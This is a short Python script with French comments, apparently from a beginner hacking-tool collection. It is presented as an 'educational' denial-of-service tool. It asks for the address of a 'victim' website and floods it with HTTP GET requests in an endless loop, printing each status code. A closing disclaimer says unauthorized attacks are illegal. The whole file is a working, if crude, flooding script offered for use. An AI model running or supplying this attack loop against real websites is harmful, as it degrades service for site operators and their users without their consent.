#DOS uniquement pour l'eductation  et l'apprentissage
from Config.Config import *
from Config.Util import *
import requests
print(f"{BEFORE + current_time_hour() + AFTER} Ce programme est uniquement a objectif educatif et destiné au debutant \n{BEFORE + current_time_hour() + AFTER} Entrez l'adresse du site victime:{color.RESET} ")
target = input()

while True:
    r = requests.get(target)

    print(r.status_code)

#FR: Ce code est uniquement à but éducatif. Lancer des attaques DOS sur des serveurs sans autorisation explicite est illégal et contraire à l'éthique. Utilisez ce code uniquement dans un environnement contrôlé où vous avez la permission de le faire.
